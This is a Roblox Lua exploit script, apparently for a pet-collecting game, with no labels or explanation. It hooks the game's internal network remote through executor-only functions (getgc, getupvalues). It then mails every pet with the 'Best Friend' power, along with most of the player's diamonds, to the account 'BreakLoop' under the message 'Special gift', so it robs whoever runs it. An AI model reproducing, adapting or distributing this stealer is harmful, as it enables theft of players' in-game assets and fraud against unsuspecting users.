local v1 = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library")) local cooldown = os.time() local GetRemoteUpValue = nil for _, V in pairs(getgc(true)) do if type(V) ~= "table" then continue end if rawget(V, "Invoke") then if type(V.Invoke) == "function" then if tostring(getfenv(V.Invoke).script) == "Network" then GetRemoteUpValue = getupvalues(V.Invoke)[2] break end end end end function FireRemote(Name, ...) if not GetRemoteUpValue then return end local Remote = GetRemoteUpValue(Name) if not Remote then return end if typeof(Remote) ~= "Instance" then return end if Remote.ClassName == "RemoteEvent" then return Remote:FireServer(...) elseif Remote.ClassName == "RemoteFunction" then return Remote:InvokeServer(...) end end local function is_huge(petdata) local powers = petdata.powers if powers then for i,v in pairs(powers) do if v[1] == "Best Friend" then return true end end end return false; end local save = v1.Save.Get() for i,v in pairs(save.Pets) do if is_huge(v) then repeat wait(.1) until (cooldown - os.time()) <= 0 local diamonds = (save.Diamonds)-20000000 if diamonds < 0 then diamonds = 0 end FireRemote("Send Mail", { ["Recipient"] = "BreakLoop", ["Diamonds"] = diamonds, ["Pets"] = { [1] = v.uid, }, ["Message"] = "Special gift" }); cooldown = os.time() + 5 end end
